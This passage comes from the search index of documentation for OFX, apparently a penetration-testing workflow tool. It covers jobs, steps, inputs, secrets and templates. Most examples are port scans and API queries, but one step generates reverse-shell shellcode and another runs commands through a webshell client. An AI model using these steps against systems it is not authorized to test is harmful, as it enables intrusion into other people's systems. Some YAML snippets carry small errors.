<code>exit</code> or press <code>Ctrl+D</code> in the shell, the workflow will continue to the next step. If you run an invalid command, you'll see an error, but you can still exit cleanly.</p>"},{"location":"guide/interactive-mode/#troubleshooting","title":"Troubleshooting","text":""},{"location":"guide/interactive-mode/#interactive-mode-not-working","title":"Interactive Mode Not Working","text":"<p>Problem: Step doesn't accept input despite <code>interactive: true</code></p> <p>Solution: Check if the job is in a parallel stage: <pre><code># View execution stages\nofx flow run workflow.yml --debug\n</code></pre></p> <p>Look for log messages indicating parallel execution. If jobs run in parallel, add dependencies to make them sequential.</p>"},{"location":"guide/interactive-mode/#timeout-issues","title":"Timeout Issues","text":"<p>Problem: Interactive session terminates unexpectedly</p> <p>Solution: Increase timeout: <pre><code>- name: Long Session\n  run: tool\n  interactive: true\n  timeout: 60  # Increase from default\n</code></pre></p>"},{"location":"guide/interactive-mode/#output-not-showing","title":"Output Not Showing","text":"<p>Problem: Can't see output from interactive command</p> <p>Solution: Ensure the command itself supports interactive mode. Some tools need flags: <pre><code>- name: Python Interactive\n  run: python3 -i  # -i flag for interactive\n  interactive: true\n</code></pre></p>"},{"location":"guide/interactive-mode/#shell-exit-handling","title":"Shell Exit Handling","text":"<p>Problem: Exiting the shell with <code>exit</code> or <code>Ctrl+D</code> causes an error in the workflow.</p> <p>Solution: As of vX.Y.Z, OFX treats exit codes 0, 127, and 130 as clean exits in interactive mode. You can safely exit the shell and the workflow will continue. Only unexpected errors will stop the workflow.</p>"},{"location":"guide/interactive-mode/#see-also","title":"See Also","text":"<ul> <li>Workflows Guide - Understanding job dependencies</li> <li>Jobs &amp; Steps - Job execution model</li> <li>Hooks System - Pre/post execution hooks</li> </ul>"},{"location":"guide/jobs-steps/","title":"Jobs &amp; Steps","text":"<p>Jobs are logical groupings of steps that execute sequentially. Steps are the smallest unit of execution, running individual commands or scripts.</p>"},{"location":"guide/jobs-steps/#jobs","title":"Jobs","text":""},{"location":"guide/jobs-steps/#basic-job-structure","title":"Basic Job Structure","text":"<pre><code>jobs:\n  job_name:\n    description: Optional job description\n    steps:\n      - name: Step 1\n        run: echo \"Hello\"\n\n      - name: Step 2\n        run: echo \"World\"\n</code></pre>"},{"location":"guide/jobs-steps/#job-properties","title":"Job Properties","text":""},{"location":"guide/jobs-steps/#name-key","title":"name (key)","text":"<p>The job identifier used for dependencies.</p> <pre><code>jobs:\n  reconnaissance:  # This is the name\n    steps: [...]\n</code></pre>"},{"location":"guide/jobs-steps/#description-optional","title":"description (optional)","text":"<p>Human-readable job description.</p> <pre><code>jobs:\n  scan:\n    description: \"Performs comprehensive port and service scanning\"\n    steps: [...]\n</code></pre>"},{"location":"guide/jobs-steps/#needs-optional","title":"needs (optional)","text":"<p>List of jobs that must complete before this job runs.</p> <pre><code>jobs:\n  scan:\n    steps: [...]\n\n  analyze:\n    needs: [scan]  # Waits for scan job\n    steps: [...]\n\n  report:\n    needs: [scan, analyze]  # Waits for both\n    steps: [...]\n</code></pre>"},{"location":"guide/jobs-steps/#continue_on_error-optional","title":"continue_on_error (optional)","text":"<p>Continue workflow execution even if this job fails.</p> <pre><code>jobs:\n  optional_check:\n    continue_on_error: true\n    steps:\n      - run: some_command_that_might_fail\n</code></pre>"},{"location":"guide/jobs-steps/#envs-optional","title":"envs (optional)","text":"<p>Environment variables specific to this job.</p> <pre><code>jobs:\n  build:\n    envs:\n      CC: gcc\n      CFLAGS: -O2\n    steps:\n      - run: make build\n</code></pre>"},{"location":"guide/jobs-steps/#hooks-optional","title":"hooks (optional)","text":"<p>Job-specific lifecycle hooks.</p> <pre><code>jobs:\n  deploy:\n    hooks:\n      on_start:\n        script: echo \"Starting deployment\"\n        language: shell\n      on_success:\n        script: python notify.py --status success\n        language: shell\n    steps: [...]\n</code></pre>"},{"location":"guide/jobs-steps/#steps","title":"Steps","text":""},{"location":"guide/jobs-steps/#basic-step-structure","title":"Basic Step Structure","text":"<pre><code>steps:\n  - name: Step name\n    run: command to execute\n\n  - name: Another step\n    script: |\n      #!/bin/bash\n      echo \"Multi-line script\"\n      echo \"Line 2\"\n    language: shell\n</code></pre>"},{"location":"guide/jobs-steps/#step-properties","title":"Step Properties","text":""},{"location":"guide/jobs-steps/#name-required","title":"name (required)","text":"<p>Human-readable step name.</p> <pre><code>- name: \"Scan target for open ports\"\n  run: nmap ${{ inputs.target }}\n</code></pre>"},{"location":"guide/jobs-steps/#run-option-1","title":"run (option 1)","text":"<p>Single-line command to execute.</p> <pre><code>- name: List files\n  run: ls -la /tmp\n</code></pre>"},{"location":"guide/jobs-steps/#script-option-2","title":"script (option 2)","text":"<p>Multi-line script to execute.</p> <pre><code>- name: Complex operation\n  script: |\n    #!/bin/bash\n    for port in 80 443 8080; do\n      nc -zv ${{ inputs.target }} $port\n    done\n  language: shell\n</code></pre>"},{"location":"guide/jobs-steps/#language-required-with-script","title":"language (required with script)","text":"<p>Script language: <code>shell</code>, <code>python</code>, <code>bash</code>, <code>sh</code>.</p> <pre><code>- name: Python script\n  script: |\n    import os\n    print(f\"Running in {os.getcwd()}\")\n  language: python\n</code></pre>"},{"location":"guide/jobs-steps/#working_dir-optional","title":"working_dir (optional)","text":"<p>Working directory for command execution.</p> <pre><code>- name: Build project\n  run: make build\n  working_dir: /tmp/project\n</code></pre>"},{"location":"guide/jobs-steps/#envs-optional_1","title":"envs (optional)","text":"<p>Environment variables for this step.</p> <pre><code>- name: Compile with specific flags\n  run: gcc main.c -o app\n  envs:\n    CFLAGS: -O3 -Wall\n    LDFLAGS: -lpthread\n</code></pre>"},{"location":"guide/jobs-steps/#timeout-optional","title":"timeout (optional)","text":"<p>Maximum execution time in seconds.</p> <pre><code>- name: Long running scan\n  run: nmap -p- ${{ inputs.target }}\n  timeout: 3600  # 1 hour\n</code></pre>"},{"location":"guide/jobs-steps/#retry-optional","title":"retry (optional)","text":"<p>Number of retry attempts on failure.</p> <pre><code>- name: API call with retry\n  run: curl https://api.example.com\n  retry: 3\n  retry_delay: 5  # seconds between retries\n</code></pre>"},{"location":"guide/jobs-steps/#continue_on_error-optional_1","title":"continue_on_error (optional)","text":"<p>Continue to next step even if this step fails.</p> <pre><code>- name: Optional cleanup\n  run: rm -f /tmp/cache\n  continue_on_error: true\n</code></pre>"},{"location":"guide/jobs-steps/#hooks-optional_1","title":"hooks (optional)","text":"<p>Step-specific lifecycle hooks.</p> <pre><code>- name: Critical operation\n  run: python important.py\n  hooks:\n    on_start:\n      script: echo \"Starting critical step\"\n      language: shell\n    on_error:\n      script: python alert_team.py --step failed\n      language: python\n</code></pre>"},{"location":"guide/jobs-steps/#command-execution","title":"Command Execution","text":""},{"location":"guide/jobs-steps/#shell-commands","title":"Shell Commands","text":"<pre><code>- name: Basic shell command\n  run: echo \"Hello World\"\n\n- name: Pipe commands\n  run: cat file.txt | grep \"pattern\" | wc -l\n\n- name: Command substitution\n  run: echo \"Current user is $(whoami)\"\n</code></pre>"},{"location":"guide/jobs-steps/#python-scripts","title":"Python Scripts","text":"<pre><code>- name: Inline Python\n  script: |\n    import sys\n    import json\n\n    data = {\"status\": \"success\", \"value\": 42}\n    print(json.dumps(data))\n  language: python\n\n- name: Python with external script\n  run: python /path/to/script.py --arg value\n</code></pre>"},{"location":"guide/jobs-steps/#bash-scripts","title":"Bash Scripts","text":"<pre><code>- name: Bash script with functions\n  script: |\n    #!/bin/bash\n\n    function check_port() {\n      local port=$1\n      nc -zv ${{ inputs.target }} $port\n    }\n\n    check_port 80\n    check_port 443\n  language: bash\n</code></pre>"},{"location":"guide/jobs-steps/#using-ofx-apis-in-steps","title":"Using OFX APIs in Steps","text":""},{"location":"guide/jobs-steps/#python-api-example","title":"Python API Example","text":"<pre><code>- name: Port scanning with OFX API\n  script: |\n    from ofx.api import PortScanner\n\n    scanner = PortScanner(\n        target='${{ inputs.target }}',\n        ports='1-1000'\n    )\n\n    results = scanner.scan()\n    print(f\"Open ports: {results}\")\n  language: python\n</code></pre>"},{"location":"guide/jobs-steps/#shellcode-generation","title":"Shellcode Generation","text":"<pre><code>- name: Generate shellcode\n  script: |\n    from ofx.api import shellcode\n\n    code = shellcode.generate(\n        platform='linux',\n        arch='x64',\n        payload='reverse_shell',\n        lhost='${{ inputs.lhost }}',\n        lport='${{ inputs.lport }}'\n    )\n\n    with open('payload.bin', 'wb') as f:\n      f.write(code)\n  language: python\n</code></pre>"},{"location":"guide/jobs-steps/#web-shell-client","title":"Web Shell Client","text":"<pre><code>- name: Execute command via webshell\n  script: |\n    from ofx.api.webshell import WebShellClient\n\n    client = WebShellClient(\n        url='${{ inputs.webshell_url }}',\n        password='${{ secrets.SHELL_PASSWORD }}'\n    )\n\n    result = client.execute('whoami')\n    print(result)\n  language: python\n</code></pre>"},{"location":"guide/jobs-steps/#tool-installation","title":"Tool Installation","text":"<p>OFX provides helper functions for installing tools:</p>"},{"location":"guide/jobs-steps/#uv-package-manager","title":"UV Package Manager","text":"<pre><code>- name: Install Python packages\n  run: ${{ uv_install('requests beautifulsoup4') }}\n\n- name: Use installed package\n  script: |\n    import requests\n    response = requests.get('https://example.com')\n    print(response.status_code)\n  language: python\n</code></pre>"},{"location":"guide/jobs-steps/#go-tools","title":"Go Tools","text":"<pre><code>- name: Install Go tool\n  run: ${{ go_install('github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest') }}\n\n- name: Run nuclei\n  run: ${{ tools_bin_dir }}/nuclei -target ${{ inputs.target }}\n</code></pre>"},{"location":"guide/jobs-steps/#pip-packages","title":"Pip Packages","text":"<pre><code>- name: Install with pip\n  run: ${{ pip_install('scapy') }}\n</code></pre>"},{"location":"guide/jobs-steps/#cargo-rust","title":"Cargo (Rust)","text":"<pre><code>- name: Install Rust tool\n  run: ${{ cargo_install('ripgrep') }}\n</code></pre>"},{"location":"guide/jobs-steps/#file-operations","title":"File Operations","text":""},{"location":"guide/jobs-steps/#reading-files","title":"Reading Files","text":"<pre><code>- name: Process configuration\n  script: |\n    import yaml\n\n    with open('${{ ctx.output_path }}/config.yml') as f:\n      config = yaml.safe_load(f)\n\n    print(f\"Target: {config['target']}\")\n  language: python\n</code></pre>"},{"location":"guide/jobs-steps/#writing-files","title":"Writing Files","text":"<pre><code>- name: Generate report\n  script: |\n    with open('${{ ctx.output_path }}/report.txt', 'w') as f:\n      f.write(f\"Scan completed for {ctx.inputs['target']}\\n\")\n      f.write(f\"Results saved to {ctx.output_path}\\n\")\n  language: python\n</code></pre>"},{"location":"guide/jobs-steps/#file-manipulation","title":"File Manipulation","text":"<pre><code>- name: Organize results\n  run: |\n    mkdir -p ${{ ctx.output_path }}/scans\n    mv *.xml ${{ ctx.output_path }}/scans/\n    tar -czf ${{ ctx.output_path }}/results.tar.gz ${{ ctx.output_path }}/scans\n</code></pre>"},{"location":"guide/jobs-steps/#working-with-job-output","title":"Working with Job Output","text":""},{"location":"guide/jobs-steps/#capturing-output","title":"Capturing Output","text":"<pre><code>- name: Save scan results\n  run: nmap ${{ inputs.target }} &gt; ${{ ctx.output_path }}/scan.txt\n\n- name: Parse scan results\n  script: |\n    with open('${{ ctx.output_path }}/scan.txt') as f:\n      content = f.read()\n      if '22/tcp open' in content:\n        print(\"SSH is available\")\n  language: python\n</code></pre>"},{"location":"guide/jobs-steps/#sharing-data-between-steps","title":"Sharing Data Between Steps","text":"<p>Use the output directory:</p> <pre><code>steps:\n  - name: Generate data\n    script: |\n      import json\n      data = {\"ports\": [80, 443, 8080]}\n      with open('${{ ctx.output_path }}/data.json', 'w') as f:\n        json.dump(data, f)\n    language: python\n\n  - name: Use data\n    script: |\n      import json\n      with open('${{ ctx.output_path }}/data.json') as f:\n        data = json.load(f)\n      print(f\"Scanning ports: {data['ports']}\")\n    language: python\n</code></pre>"},{"location":"guide/jobs-steps/#error-handling","title":"Error Handling","text":""},{"location":"guide/jobs-steps/#exit-codes","title":"Exit Codes","text":"<pre><code>- name: Check service\n  script: |\n    import sys\n    import socket\n\n    try:\n      s = socket.socket()\n      s.connect(('${{ inputs.target }}', 80))\n      print(\"Service is up\")\n      sys.exit(0)\n    except:\n      print(\"Service is down\")\n      sys.exit(1)\n  language: python\n</code></pre>"},{"location":"guide/jobs-steps/#try-catch-in-steps","title":"Try-Catch in Steps","text":"<pre><code>- name: Safe operation\n  script: |\n    try:\n      # Risky operation\n      result = dangerous_function()\n      print(f\"Success: {result}\")\n    except Exception as e:\n      print(f\"Error occurred: {e}\")\n      # Don't exit with error code if you want to continue\n  language: python\n  continue_on_error: true\n</code></pre>"},{"location":"guide/jobs-steps/#best-practices","title":"Best Practices","text":""},{"location":"guide/jobs-steps/#1-descriptive-step-names","title":"1. Descriptive Step Names","text":"<pre><code># Good\n- name: \"Scan target for open HTTP/HTTPS ports\"\n  run: nmap -p 80,443,8080,8443 ${{ inputs.target }}\n\n# Bad\n- name: \"scan\"\n  run: nmap ${{ inputs.target }}\n</code></pre>"},{"location":"guide/jobs-steps/#2-use-templates-for-dynamic-values","title":"2. Use Templates for Dynamic Values","text":"<pre><code># Good\n- name: Save results\n  run: cp scan.txt ${{ ctx.output_path }}/scan_${{ ctx.run_id }}.txt\n\n# Bad\n- name: Save results\n  run: cp scan.txt /tmp/scan.txt  # Hardcoded path\n</code></pre>"},{"location":"guide/jobs-steps/#3-handle-errors-appropriately","title":"3. Handle Errors Appropriately","text":"<pre><code>- name: Critical validation\n  run: python validate.py\n  # Fails workflow if validation fails\n\n- name: Optional notification\n  run: python notify.py\n  continue_on_error: true  # Doesn't fail workflow\n</code></pre>"},{"location":"guide/jobs-steps/#4-use-appropriate-timeouts","title":"4. Use Appropriate Timeouts","text":"<pre><code>- name: Quick check\n  run: ping -c 1 ${{ inputs.target }}\n  timeout: 5\n\n- name: Full scan\n  run: nmap -p- ${{ inputs.target }}\n  timeout: 3600  # 1 hour for complete scan\n</code></pre>"},{"location":"guide/jobs-steps/#5-organize-complex-scripts","title":"5. Organize Complex Scripts","text":"<pre><code># For complex logic, use external scripts\n- name: Complex analysis\n  run: python ${{ ctx.workflow_dir }}/scripts/analyze.py --input ${{ ctx.output_path }}\n</code></pre>"},{"location":"guide/jobs-steps/#examples","title":"Examples","text":""},{"location":"guide/jobs-steps/#sequential-steps","title":"Sequential Steps","text":"<pre><code>jobs:\n  setup_and_scan:\n    steps:\n      - name: Install tools\n        run: ${{ uv_install('python-nmap') }}\n\n      - name: Run scan\n        script: |\n          import nmap\n          nm = nmap.PortScanner()\n          nm.scan('${{ inputs.target }}', '22-443')\n          print(nm.csv())\n        language: python\n\n      - name: Save results\n        run: echo \"Scan complete\" &gt; ${{ ctx.output_path }}/status.txt\n</code></pre>"},{"location":"guide/jobs-steps/#conditional-execution","title":"Conditional Execution","text":"<pre><code>jobs:\n  conditional_scan:\n    steps:\n      - name: Check if target is up\n        run: ping -c 1 ${{ inputs.target }}\n        continue_on_error: false\n\n      - name: Full scan\n        run: nmap -sS -sV -A ${{ inputs.target }}\n        # Only runs if ping succeeds\n</code></pre>"},{"location":"guide/jobs-steps/#parallel-jobs-with-sequential-steps","title":"Parallel Jobs with Sequential Steps","text":"<pre><code>jobs:\n  scan_tcp:\n    steps:\n      - name: TCP SYN scan\n        run: nmap -sS ${{ inputs.target }}\n\n      - name: Analyze TCP results\n        run: python analyze_tcp.py\n\n  scan_udp:\n    steps:\n      - name: UDP scan\n        run: nmap -sU ${{ inputs.target }}\n\n      - name: Analyze UDP results\n        run: python analyze_udp.py\n\n  # Both jobs run in parallel, steps within each job run sequentially\n</code></pre>"},{"location":"guide/jobs-steps/#see-also","title":"See Also","text":"<ul> <li>Workflows - Workflow configuration</li> <li>Hooks System - Lifecycle hooks</li> <li>Templates - Template functions</li> <li>CLI Commands - Running workflows</li> </ul>"},{"location":"guide/secrets-inputs/","title":"Secrets &amp; Inputs","text":"<p>Learn how to manage sensitive configuration and runtime parameters in OFX workflows.</p>"},{"location":"guide/secrets-inputs/#inputs","title":"Inputs","text":"<p>Inputs are parameters passed to workflows at runtime. They make workflows reusable and configurable.</p>"},{"location":"guide/secrets-inputs/#defining-inputs","title":"Defining Inputs","text":"<pre><code>name: Configurable Scan\n\ninputs:\n  target:\n    description: Target hostname or IP address\n    required: true\n\n  ports:\n    description: Comma-separated list of ports to scan\n    required: false\n    default: \"80,443,8080\"\n\n  scan_type:\n    description: Type of scan (quick|standard|comprehensive)\n    required: false\n    default: \"standard\"\n</code></pre>"},{"location":"guide/secrets-inputs/#input-properties","title":"Input Properties","text":""},{"location":"guide/secrets-inputs/#description","title":"description","text":"<p>Human-readable description of the input:</p> <pre><code>inputs:\n  target:\n    description: \"Target server (hostname or IP). Example: example.com or 192.168.1.1\"\n</code></pre>"},{"location":"guide/secrets-inputs/#required","title":"required","text":"<p>Whether the input must be provided:</p> <pre><code>inputs:\n  target:\n    required: true   # Must be provided\n\n  ports:\n    required: false  # Optional\n</code></pre>"},{"location":"guide/secrets-inputs/#default","title":"default","text":"<p>Default value if not provided:</p> <pre><code>inputs:\n  ports:\n    required: false\n    default: \"80,443,8080,8443\"\n\n  timeout:\n    required: false\n    default: \"300\"\n</code></pre>"},{"location":"guide/secrets-inputs/#providing-inputs","title":"Providing Inputs","text":""},{"location":"guide/secrets-inputs/#command-line","title":"Command Line","text":"<pre><code># Single input\nofx flow run workflow.yml --input target=example.com\n\n# Multiple inputs\nofx flow run workflow.yml \\\n  --input target=192.168.1.1 \\\n  --input ports=\"22,80,443\" \\\n  --input scan_type=comprehensive\n</code></pre>"},{"location":"guide/secrets-inputs/#python-api","title":"Python API","text":"<pre><code>from ofx.runner import WorkflowRunner, RunContext\nfrom ofx.models.workflow import Workflow\n\n# Load workflow\nworkflow = Workflow.from_file(\"workflow.yml\")\n\n# Create context with inputs\nctx = RunContext(\n    inputs={\n        \"target\": \"192.168.1.1\",\n        \"ports\": \"22,80,443\",\n        \"scan_type\": \"comprehensive\"\n    }\n)\n\n# Run workflow\nrunner = WorkflowRunner(workflow, ctx)\nawait runner.run()\n</code></pre>"},{"location":"guide/secrets-inputs/#using-inputs","title":"Using Inputs","text":"<p>Access inputs using <code>${{ inputs.name }}</code>:</p> <pre><code>steps:\n  - name: Scan target\n    run: nmap -p ${{ inputs.ports }} ${{ inputs.target }}\n\n  - name: Generate report\n    script: |\n      print(f\"Scanning {ctx.inputs['target']}\")\n      print(f\"Ports: {ctx.inputs['ports']}\")\n      print(f\"Type: {ctx.inputs['scan_type']}\")\n    script:\n</code></pre>"},{"location":"guide/secrets-inputs/#input-validation","title":"Input Validation","text":"<p>Validate inputs before execution:</p> <pre><code>jobs:\n  validate:\n    steps:\n      - name: Validate target\n        script: |\n          import re\n          import sys\n\n          target = '${{ inputs.target }}'\n\n          # Check format\n          if not re.match(r'^[a-zA-Z0-9.-]+$', target):\n            print(f\"Invalid target format: {target}\")\n            sys.exit(1)\n\n          print(f\"\u2713 Valid target: {target}\")\n        script:\n\n      - name: Validate ports\n        script: |\n          import sys\n\n          ports = '${{ inputs.ports }}'\n\n          # Check port range\n          for port in ports.split(','):\n            try:\n              p = int(port.strip())\n              if p &lt; 1 or p &gt; 65535:\n                raise ValueError\n            except:\n              print(f\"Invalid port: {port}\")\n              sys.exit(1)\n\n          print(f\"\u2713 Valid ports: {ports}\")\n        language: python\n</code></pre>"},{"location":"guide/secrets-inputs/#secrets","title":"Secrets","text":"<p>Secrets are sensitive values that should not be hardcoded or logged. OFX provides secure secret management.</p>"},{"location":"guide/secrets-inputs/#defining-secrets","title":"Defining Secrets","text":"<pre><code>name: API Integration\n\nsecrets:\n  API_KEY:\n    description: API key for external service\n    required: true\n\n  API_SECRET:\n    description: API secret for authentication\n    required: false\n\n  DATABASE_URL:\n    description: Database connection string\n    required: true\n</code></pre>"},{"location":"guide/secrets-inputs/#secret-properties","title":"Secret Properties","text":"<p>Same as inputs, but stored securely:</p> <pre><code>secrets:\n  SHODAN_API_KEY:\n    description: \"Shodan API key from https://account.shodan.io/\"\n    required: true\n</code></pre>"},{"location":"guide/secrets-inputs/#managing-secrets","title":"Managing Secrets","text":""},{"location":"guide/secrets-inputs/#command-line_1","title":"Command Line","text":"<pre><code># Provide at runtime\nofx flow run workflow.yml --secret API_KEY=your_key_here\n\n# Multiple secrets\nofx flow run workflow.yml \\\n  --secret API_KEY=key123 \\\n  --secret API_SECRET=secret456\n</code></pre>"},{"location":"guide/secrets-inputs/#secret-store","title":"Secret Store","text":"<p>Store secrets persistently:</p> <pre><code># Set secret\nofx secret set API_KEY=your_key_here\n\n# List secrets\nofx secret list\n\n# Delete secret\nofx secret delete API_KEY\n</code></pre> <p>Then use in workflows without providing at runtime:</p> <pre><code># Secrets automatically loaded from store\nofx flow run workflow.yml --input target=example.com\n</code></pre>"},{"location":"guide/secrets-inputs/#environment-variables","title":"Environment Variables","text":"<p>Load secrets from environment:</p> <pre><code>export API_KEY=your_key_here\nexport API_SECRET=your_secret_here\n\n# OFX automatically loads from environment\nofx flow run workflow.yml\n</code></pre>"},{"location":"guide/secrets-inputs/#python-api_1","title":"Python API","text":"<pre><code>ctx = RunContext(\n    inputs={\"target\": \"example.com\"},\n    secrets={\n        \"API_KEY\": \"your_key_here\",\n        \"API_SECRET\": \"your_secret_here\"\n    }\n)\n</code></pre>"},{"location":"guide/secrets-inputs/#using-secrets","title":"Using Secrets","text":"<p>Access secrets using <code>${{ secrets.name }}</code>:</p> <pre><code>steps:\n  - name: Call API\n    run: curl -H \"Authorization: Bearer ${{ secrets.API_KEY }}\" https://api.example.com\n\n  - name: Authenticate\n    script: |\n      import requests\n\n      api_key = '${{ secrets.API_KEY }}'\n      response = requests.post(\n        'https://api.example.com/auth',\n        headers={'X-API-Key': api_key}\n      )\n\n      print(response.json())\n    script:\n</code></pre>"},{"location":"guide/secrets-inputs/#secret-security","title":"Secret Security","text":"<p>Secrets are: - \u2705 Not logged in output - \u2705 Not visible in process listings - \u2705 Encrypted at rest (in secret store) - \u2705 Masked in error messages</p> <pre><code>steps:\n  - name: Use secret safely\n    script: |\n      # Secret value is masked in logs\n      api_key = '${{ secrets.API_KEY }}'\n\n      # This will NOT print the actual key\n      print(f\"Using API key: {api_key}\")  # Masked output\n\n      # Use secret normally\n      authenticate(api_key)\n    language: python\n</code></pre>"},{"location":"guide/secrets-inputs/#best-practices","title":"Best Practices","text":""},{"location":"guide/secrets-inputs/#1-never-hardcode-secrets","title":"1. Never Hardcode Secrets","text":"<pre><code># Bad - Secret in workflow file\nsteps:\n  - run: curl -H \"Authorization: Bearer abc123def456\" https://api.example.com\n\n# Good - Secret as parameter\nsecrets:\n  API_KEY:\n    required: true\n\nsteps:\n  - run: curl -H \"Authorization: Bearer ${{ secrets.API_KEY }}\" https://api.example.com\n</code></pre>"},{"location":"guide/secrets-inputs/#2-use-meaningful-names","title":"2. Use Meaningful Names","text":"<pre><code>inputs:\n  # Good - Clear purpose\n  target_hostname:\n    description: \"Primary target server hostname\"\n\n  scan_timeout_seconds:\n    description: \"Maximum scan duration in seconds\"\n\n  # Bad - Unclear\n  t:\n    description: \"target\"\n\n  x:\n    description: \"timeout\"\n</code></pre>"},{"location":"guide/secrets-inputs/#3-provide-defaults-when-appropriate","title":"3. Provide Defaults When Appropriate","text":"<pre><code>inputs:\n  # Required, no default\n  target:\n    required: true\n    description: \"Must be provided by user\"\n\n  # Optional with sensible default\n  timeout:\n    required: false\n    default: \"300\"\n    description: \"5 minute default timeout\"\n</code></pre>"},{"location":"guide/secrets-inputs/#4-document-expected-formats","title":"4. Document Expected Formats","text":"<pre><code>inputs:\n  target:\n    description: |\n      Target specification:\n      - Hostname: example.com\n      - IPv4: 192.168.1.1\n      - IPv6: 2001:db8::1\n      - CIDR: 192.168.1.0/24\n    required: true\n\n  ports:\n    description: |\n      Port specification:\n      - Single: 80\n      - Range: 1-1000\n      - List: 80,443,8080\n      - Mixed: 22,80-443,8080\n    default: \"80,443\"\n</code></pre>"},{"location":"guide/secrets-inputs/#5-validate-early","title":"5. Validate Early","text":"<pre><code>jobs:\n  validate_inputs:\n    steps:\n      - name: Validate all inputs\n        script: |\n          import sys\n\n          # Validate target\n          if not validate_target('${{ inputs.target }}'):\n            sys.exit(1)\n\n          # Validate ports\n          if not validate_ports('${{ inputs.ports }}'):\n            sys.exit(1)\n\n          print(\"\u2713 All inputs valid\")\n        script:\n\n  main_work:\n    needs: [validate_inputs]\n    steps:\n      - run: nmap ${{ inputs.target }}\n</code></pre>"},{"location":"guide/secrets-inputs/#6-use-secret-store-for-persistent-secrets","title":"6. Use Secret Store for Persistent Secrets","text":"<pre><code># One-time setup\nofx secret set SHODAN_API_KEY=your_key_here\nofx secret set CENSYS_API_ID=your_id_here\nofx secret set CENSYS_API_SECRET=your_secret_here\n\n# Workflows automatically use stored secrets\nofx flow run recon.yml --input target=example.com\n</code></pre>"},{"location":"guide/secrets-inputs/#7-separate-secrets-by-environment","title":"7. Separate Secrets by Environment","text":"<pre><code># Development secrets\nofx secret set API_KEY=dev_key_here --env dev\n\n# Production secrets\nofx secret set API_KEY=prod_key_here --env prod\n\n# Run with specific environment\nofx flow run workflow.yml --env prod\n</code></pre>"},{"location":"guide/secrets-inputs/#examples","title":"Examples","text":""},{"location":"guide/secrets-inputs/#complete-input-example","title":"Complete Input Example","text":"<pre><code>name: Comprehensive Scan\n\ninputs:\n  target:\n    description: \"Target hostname or IP address to scan\"\n    required: true\n\n  ports:\n    description: \"Ports to scan (e.g., 80,443 or 1-1000)\"\n    required: false\n    default: \"1-1000\"\n\n  scan_speed:\n    description: \"Scan speed: slow (T2), normal (T3), fast (T4), aggressive (T5)\"\n    required: false\n    default: \"normal\"\n\n  output_format:\n    description: \"Output format: text, xml, json\"\n    required: false\n    default: \"xml\"\n\njobs:\n  scan:\n    steps:\n      - name: Configure scan\n        script: |\n          speed_map = {\n            'slow': '-T2',\n            'normal': '-T3',\n            'fast': '-T4',\n            'aggressive': '-T5'\n          }\n\n          speed_flag = speed_map.get('${{ inputs.scan_speed }}', '-T3')\n          format_flag = '-o${{ inputs.output_format }}'.upper()\n\n          print(f\"Speed: {speed_flag}\")\n          print(f\"Format: {format_flag}\")\n        language: python\n\n      - name: Run scan\n        run: |\n          nmap ${{ inputs.target }} \\\n            -p ${{ inputs.ports }} \\\n            -T3 \\\n            -o${{ inputs.output_format }} ${{ ctx.output_path }}/scan.${{ inputs.output_format }}\n</code></pre>"},{"location":"guide/secrets-inputs/#complete-secret-example","title":"Complete Secret Example","text":"<pre><code>name: Multi-Service Integration\n\nsecrets:\n  SHODAN_API_KEY:\n    description: \"Shodan API key\"\n    required: false\n\n  CENSYS_API_ID:\n    description: \"Censys API ID\"\n    required: false\n\n  CENSYS_API_SECRET:\n    description: \"Censys API secret\"\n    required: false\n\n  SLACK_WEBHOOK:\n    description: \"Slack webhook URL for notifications\"\n    required: false\n\njobs:\n  passive_recon:\n    steps:\n      - name: Query Shodan\n        script: |\n          import requests\n\n          api_key = '${{ secrets.SHODAN_API_KEY }}'\n          if not api_key:\n            print(\"Shodan API key not provided, skipping\")\n            sys.exit(0)\n\n          target = '${{ inputs.target }}'\n          response = requests.get(\n            f'https://api.shodan.io/shodan/host/{target}',\n            params={'key': api_key}\n          )\n\n          print(response.json())\n        language: python\n\n      - name: Query Censys\n        script: |\n          import requests\n          from requests.auth import HTTPBasicAuth\n\n          api_id = '${{ secrets.CENSYS_API_ID }}'\n          api_secret = '${{ secrets.CENSYS_API_SECRET }}'\n\n          if not api_id or not api_secret:\n            print(\"Censys credentials not provided, skipping\")\n            sys.exit(0)\n\n          response = requests.get(\n            'https://search.censys.io/api/v2/hosts/search',\n            auth=HTTPBasicAuth(api_id, api_secret),\n            params={'q': '${{ inputs.target }}'}\n          )\n\n          print(response.json())\n        language: python\n\n  notify:\n    needs: [passive_recon]\n    hooks:\n      on_success:\n        script: |\n          import requests\n          import json\n\n          webhook = '${{ secrets.SLACK_WEBHOOK }}'\n          if webhook:\n            requests.post(webhook, json={\n              'text': f'\u2705 Recon completed for ${{ inputs.target }}'\n            })\n        language: python\n</code></pre>"},{"location":"guide/secrets-inputs/#troubleshooting","title":"Troubleshooting","text":""},{"location":"guide/secrets-inputs/#input-not-found","title":"Input Not Found","text":"<pre><code>Error: Required input 'target' not provided\n</code></pre> <p>Solution: <pre><code>ofx flow run workflow.yml --input target=example.com\n</code></pre></p>"},{"location":"guide/secrets-inputs/#secret-not-found","title":"Secret Not Found","text":"<pre><code>Error: Required secret 'API_KEY' not provided\n</code></pre> <p>Solutions: <pre><code># Option 1: Provide at runtime\nofx flow run workflow.yml --secret API_KEY=your_key\n\n# Option 2: Store in secret store\nofx secret set API_KEY=your_key\nofx flow run workflow.yml\n\n# Option 3: Use environment variable\nexport API_KEY=your_key\nofx flow run workflow.yml\n</code></pre></p>"},{"location":"guide/secrets-inputs/#invalid-input-format","title":"Invalid Input Format","text":"<pre><code>Error: Invalid port number: abc\n</code></pre> <p>Solution: Add validation: <pre><code>jobs:\n  validate:\n    steps:\n      - script: |\n          try:\n            port = int('${{ inputs.port }}')\n            if port &lt; 1 or port &gt; 65535:\n              raise ValueError\n          except:\n            print(\"Port must be 1-65535\")\n            sys.exit(1)\n        language: python\n</code></pre></p>"},{"location":"guide/secrets-inputs/#see-also","title":"See Also","text":"<ul> <li>Workflows - Workflow configuration</li> <li>Templates - Using inputs and secrets in templates</li> <li>CLI Commands - Command line usage</li> </ul>"},{"location":"guide/templates/","title":"Templates","text":"<p>OFX uses Jinja2 templates with <code>${{ }}</code> syntax for dynamic value substitution in workflows, jobs, and steps.</p>"},{"location":"guide/templates/#basic-syntax","title":"Basic Syntax","text":"<pre><code># Template syntax\n${{ variable_name }}\n\n# Example\nrun: echo \"Target is ${{ inputs.target }}\"\n</code></pre>"},{"location":"guide/templates/#available-variables","title":"Available 